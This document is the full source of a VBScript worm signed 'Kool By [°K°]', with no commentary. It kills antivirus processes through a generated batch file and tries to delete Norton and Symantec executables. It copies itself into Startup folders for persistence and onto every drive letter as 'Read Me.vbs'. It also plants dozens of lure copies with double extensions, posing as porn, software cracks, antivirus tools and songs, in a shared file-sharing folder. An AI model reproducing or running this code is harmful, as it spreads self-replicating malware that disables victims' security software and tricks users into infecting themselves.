   ' Kool By [°K°]
   On Error Resume Next
     Set FSO = CreateObject("Scripting.FileSystemObject")
   vbs = Wscript.ScriptFullName
   Set WshShell = Wscript.CreateObject("Wscript.Shell")
    Set oUrlLink = WshShell.CreateShortcut("SteFanie.URL")
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set file = fso.OpenTextFile(WScript.ScriptFullname,1)
   sub regcreate(regkey,regvalue)
   Rem Enable Registry Writing
   Set regedit = CreateObject("WScript.Shell")
   regedit.RegWrite regkey,regvalue
   end sub
   function regget(value)
   Set regedit = CreateObject("WScript.Shell")
   regget=regedit.RegRead(value)
   end function
   Set windir=fso.GetSpecialFolder(0)
   Set tempdir=fso.GetSpecialFolder(2)
   Set wrte=fso.CreateTextFile(windir+"\windows.cmd")
   wrte.WriteLine "Taskkill /IM wintbp.exe.exe"
   wrte.WriteLine "Taskkill /IM mousebm.exe"
   wrte.WriteLine "Taskkill /IM mousemm.exe"
   wrte.WriteLine "Taskkill /IM mousesync.exe"
   wrte.WriteLine "Taskkill /IM wpa.exe"
   wrte.WriteLine "Taskkill /IM VPC32.exe"
   wrte.WriteLine "Taskkill /IM Navw32.exe"
   wrte.Close()
   Set shell=CreateObject("Wscript.Shell")
   shell.Run windir+"\windows.cmd"
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set k = fso.GetFile("%System%\wintbp.exe")
   Set k = fso.GetFile("%System%\mousebm.exe")
   Set k = fso.GetFile("%System%\mousemm.exe")
   Set k = fso.GetFile("%System%\mousesync.exe")
   Set k = fso.GetFile("%Windir%\debug\dcpromo.log")
   Set k = fso.GetFile("%System%\wpa.exe")
   Set k = fso.GetFile("C:\Program Files\Symantec AntiVirus\VPC32.exe")
   Set k = fso.GetFile("C:\Program Files\Norton Internet Security\Norton AntiVirus\Navw32.exe")
   k.Delete
   FSO.CopyFile vbs, "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Startup1.vbs"
   FSO.CopyFile vbs, "C:\WINDOWS\Start Menu\Programs\Startup\Starup2.vbs"
   FSO.CopyFile vbs, "C:\WINNT\Profiles\All Users\Start Menu\Programs\Startup\Startup3.vbs"
   FSO.CopyFile vbs, "A:\Read Me.vbs"
   FSO.CopyFile vbs, "B:\Read Me.vbs"
   FSO.CopyFile vbs, "G:\Read Me.vbs"
   FSO.CopyFile vbs, "H:\Read Me.vbs"
   FSO.CopyFile vbs, "I:\Read Me.vbs"
   FSO.CopyFile vbs, "J:\Read Me.vbs"
   FSO.CopyFile vbs, "K:\Read Me.vbs"
   FSO.CopyFile vbs, "L:\Read Me.vbs"
   FSO.CopyFile vbs, "M:\Read Me.vbs"
   FSO.CopyFile vbs, "N:\Read Me.vbs"
   FSO.CopyFile vbs, "O:\Read Me.vbs"
   FSO.CopyFile vbs, "P:\Read Me.vbs"
   FSO.CopyFile vbs, "Q:\Read Me.vbs"
   FSO.CopyFile vbs, "R:\Read Me.vbs"
   FSO.CopyFile vbs, "S:\Read Me.vbs"
   FSO.CopyFile vbs, "T:\Read Me.vbs"
   FSO.CopyFile vbs, "U:\Read Me.vbs"
   FSO.CopyFile vbs, "V:\Read Me.vbs"
   FSO.CopyFile vbs, "W:\Read Me.vbs"
   FSO.CopyFile vbs, "X:\Read Me.vbs"
   FSO.CopyFile vbs, "Y:\Read Me.vbs"
   FSO.CopyFile vbs, "Z:\Read Me.vbs"
   Lime = ("C:\Documents and Settings\Administrator\Shared") & "\"
   fso.copyfile vbs, Lime & "Young teen.jpg.vbs"
   fso.copyfile vbs, Lime & "Hot Girl.jpg.vbs"
   fso.copyfile vbs, Lime & "Pussy.jpg.vbs"
   fso.copyfile vbs, Lime & "sex.jpg.vbs"
   fso.copyfile vbs, Lime & "big boobs.jpg.vbs"
   fso.copyfile vbs, Lime & "Sex Tips.doc.vbs"
   fso.copyfile vbs, Lime & "Lord of the rings.doc.vbs"
   fso.copyfile vbs, Lime & "Nero.exe.vbs"
   fso.copyfile vbs, Lime & "Sex.exe.vbs"
   fso.copyfile vbs, Lime & "KAV 5.0.exe.vbs"
   fso.copyfile vbs, Lime & "Norton Anti Virus 2004.exe.vbs"
   fso.copyfile vbs, Lime & "Kaspersky Antivirus 5.0.exe.vbs"
   fso.copyfile vbs, Lime & "ICQ.exe.vbs"
   fso.copyfile vbs, Lime & "Mydoom Removal Tool.exe.vbs"
   fso.copyfile vbs, Lime & "Beagle Removal Tool.exe.vbs"
   fso.copyfile vbs, Lime & "Macfee Anti Virus.exe.vbs"
   fso.copyfile vbs, Lime & "Mcafee Crack.exe.vbs"
   fso.copyfile vbs, Lime & "Norton Anti Virus Crack.exe.vbs"
   fso.copyfile vbs, Lime & "anal,sex.exe.vbs"
   fso.copyfile vbs, Lime & "netsky removal tool.exe.vbs"
   fso.copyfile vbs, Lime & "SexXx.exe.vbs"
   fso.copyfile vbs, Lime & "Matrix.exe.vbs"
   fso.copyfile vbs, Lime & "ACDSee.exe.vbs"
   fso.copyfile vbs, Lime & "XXX hardcore.exe.vbs"
   fso.copyfile vbs, Lime & "Hot XxX Photos.exe.vbs"
   fso.copyfile vbs, Lime & "Hot Sex Photos.exe.vbs"
   fso.copyfile vbs, Lime & "1.exe.vbs"
   fso.copyfile vbs, Lime & "WinAMp.exe.vbs"
   fso.copyfile vbs, Lime & "Winrar.exe.vbs"
   fso.copyfile vbs, Lime & "WinZip.exe.vbs"
   fso.copyfile vbs, Lime & "In Da Club.exe.vbs"
   fso.copyfile vbs, Lime & "opera 7.7.exe.vbs"
   fso.copyfile vbs, Lime & "Hello.pif.vbs"
   fso.copyfile vbs, Lime & "Hello.exe.vbs"
   fso.copyfile vbs, Lime & "PS2 Emulator.exe.vbs"
   fso.copyfile vbs, Lime & "ICQ 8.0.exe.vbs"
   fso.copyfile vbs, Lime & "Microsoft Office 2003 Crack.exe.vbs"
   fso.copyfile vbs, Lime & "Lionel Richie - Just For You.mp3.vbs"
   fso.copyfile vbs, Lime & "Vasco Rossi - Buoni e cattivi.mp3.vbs"
   fso.copyfile vbs, Lime & "Raf - In tutti i miei giorni.mp3.vbs"
   fso.copyfile vbs, Lime & "Black Eyed Peas - Hey Mama.mp3.vbs"
   fso.copyfile vbs, Lime & "Haiducii - Dragostea Din Tei.mp3.vbs"
   fso.copyfile vbs, Lime & "Vanessa Carltron - Ordinary Day.mp3.vbs"
   fso.copyfile vbs, Lime & "50 Cent - In da Club.mp3.vbs"
   fso.copyfile vbs, Lime & "The Rasmus - In The Shadows.mp3.vbs"
   Msgbox "Kool By [°K°]"
   ' Kool By [°K°]
